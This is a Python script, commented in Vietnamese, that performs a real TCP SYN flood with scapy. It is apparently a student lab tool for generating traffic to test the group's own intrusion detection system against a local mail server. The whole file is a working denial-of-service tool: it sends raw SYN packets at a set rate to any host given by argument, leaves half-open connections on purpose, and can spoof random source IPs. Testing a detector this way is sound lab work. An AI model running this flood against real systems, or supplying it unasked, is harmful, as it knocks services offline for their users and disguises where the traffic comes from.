"""
syn_flood.py
------------
Kịch bản giả lập DoS SYN Flood THỰC SỰ dùng scapy để tạo và phát gói tin
raw TCP mang cờ SYN dồn dập vào cổng 25/110 của Mail Server test cục bộ,
CỐ TÌNH không hoàn tất bắt tay 3 bước (không gửi ACK phản hồi khi nhận
SYN-ACK) để tạo ra các kết nối "half-open" đúng bản chất SYN Flood — nhằm
sinh lưu lượng thật cho nids_engine/sniffer.py của Tiên bắt gói và tự phát
hiện theo ngưỡng packets/giây. Script KHÔNG tự ghi cảnh báo vào DB.

CHỈ DÙNG TRONG MÔI TRƯỜNG LAB CỦA ĐỒ ÁN PBL4 — nhắm vào máy/máy chủ do
chính nhóm dựng và kiểm soát (mặc định 127.0.0.1). Không dùng để nhắm vào
hệ thống không thuộc quyền sở hữu/được phép kiểm thử của bạn.

Yêu cầu:
    - Chạy với quyền Administrator (Windows) / root (Linux) vì cần tạo
      raw socket.
    - Đã cài Npcap (Windows) để scapy có thể gửi gói tin ở tầng liên kết.
    - pip install scapy (đã có sẵn trong .venv của dự án).

Cách chạy (PowerShell với quyền Admin):
    python syn_flood.py
    python syn_flood.py --port 110 --count 500 --pps 200
"""

import argparse
import random
import sys
import time

try:
    from scapy.all import IP, TCP, RandShort, send
except ImportError:
    sys.exit(
        "[x] Thiếu thư viện scapy. Cài bằng: pip install scapy\n"
        "    (Windows cần cài thêm Npcap: https://npcap.com/#download)"
    )

# ==========================================
# CẤU HÌNH MẶC ĐỊNH
# ==========================================
TARGET_IP = "127.0.0.1"   # Mail server test cục bộ (hMailServer)
TARGET_PORT = 25          # SMTP; đổi --port 110 để nhắm POP3


def send_syn_flood(target_ip, target_port, count, pps, spoof_src):
    print("==============================================")
    print("   DOS THẬT: TCP SYN FLOOD (scapy, raw packet) ")
    print("==============================================")
    print(f"[*] Mục tiêu: {target_ip}:{target_port}")
    print(f"[*] Số gói SYN: {count} | Tốc độ: ~{pps} gói/giây")
    print(f"[*] Giả mạo IP nguồn: {'CÓ (ngẫu nhiên)' if spoof_src else 'KHÔNG (dùng IP máy thật)'}")
    print("[*] Lưu ý: script KHÔNG gửi ACK phản hồi SYN-ACK -> half-open connection.\n")

    delay = 1.0 / pps if pps > 0 else 0
    sent = 0
    start = time.time()

    try:
        for i in range(1, count + 1):
            src_ip = _random_private_ip() if spoof_src else None
            pkt = IP(dst=target_ip) / TCP(
                sport=RandShort(),
                dport=target_port,
                flags="S",          # chỉ gửi cờ SYN, không bắt tay tiếp
                seq=random.randint(0, 4_294_967_295),
            )
            if src_ip:
                pkt[IP].src = src_ip

            send(pkt, verbose=False)
            sent += 1

            if sent % 50 == 0 or sent == count:
                elapsed = time.time() - start
                sys.stdout.write(
                    f"\r[*] Đã gửi {sent}/{count} gói SYN "
                    f"(~{sent / elapsed:.0f} gói/giây thực tế)"
                )
                sys.stdout.flush()

            if delay:
                time.sleep(delay)
    except PermissionError:
        sys.exit(
            "\n[x] Không đủ quyền gửi raw packet. Chạy lại PowerShell với quyền "
            "Administrator (và đã cài Npcap nếu đang dùng Windows)."
        )

    elapsed = time.time() - start
    print(f"\n\n[*] Kết thúc kịch bản SYN Flood.")
    print(f"[*] Tổng số gói SYN đã gửi: {sent} trong {elapsed:.1f}s "
          f"(~{sent / elapsed if elapsed > 0 else 0:.0f} gói/giây).")
    print("[*] Kiểm tra Dashboard (AlertsTable) / bảng blocked_ips để xác nhận NIDS đã phát hiện.")


def _random_private_ip():
    # Chỉ dùng dải IP riêng tư (RFC 1918) để tránh trông giống tấn công thật
    # ra ngoài Internet, dù gói tin vẫn chỉ đi tới target_ip cục bộ.
    return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def parse_args():
    parser = argparse.ArgumentParser(
        description="Giả lập DoS SYN Flood bằng scapy (chỉ dùng trong lab PBL4 của bạn)."
    )
    parser.add_argument("--host", default=TARGET_IP, help="IP mục tiêu (mặc định 127.0.0.1)")
    parser.add_argument("--port", type=int, default=TARGET_PORT, help="Cổng mục tiêu (25=SMTP, 110=POP3)")
    parser.add_argument("--count", type=int, default=300, help="Tổng số gói SYN cần gửi")
    parser.add_argument("--pps", type=int, default=100, help="Số gói/giây mong muốn (packets per second)")
    parser.add_argument("--spoof-src", action="store_true",
                         help="Giả mạo IP nguồn ngẫu nhiên (dải 10.x.x.x) cho mỗi gói thay vì dùng IP máy thật")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_args()
    try:
        send_syn_flood(args.host, args.port, args.count, args.pps, args.spoof_src)
    except KeyboardInterrupt:
        sys.exit("\n[!] Đã dừng thủ công (Ctrl+C).")